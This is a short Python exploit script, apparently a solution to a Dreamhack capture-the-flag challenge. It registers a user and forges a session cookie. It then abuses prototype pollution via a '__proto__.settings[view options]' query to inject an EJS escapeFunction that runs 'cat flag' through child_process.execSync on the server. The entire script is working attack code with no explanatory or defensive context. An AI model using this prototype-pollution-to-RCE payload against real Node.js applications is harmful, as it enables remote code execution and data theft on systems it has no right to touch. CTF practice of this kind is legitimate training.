import requests
from hashlib import sha256

url = "http://host8.dreamhack.games:23991/"

creds = {
    'username': 'hacked',
    'password': 'hacked'
}

res = requests.post(f'{url}/register', data=creds)

payload = {
    'uid': '0b1',
    'password': sha256(creds['password'].encode()).hexdigest()
}

def pollute(key, value):
    requests.get(f'{url}/api/set?key=__proto__.settings[view options][{key}]&value={value}', cookies=payload)

pollute("client", True)
pollute("escapeFunction", """1;return process.mainModule.require('child_process').execSync('cat flag').toString()""")

res = requests.get(url)
print(res.text)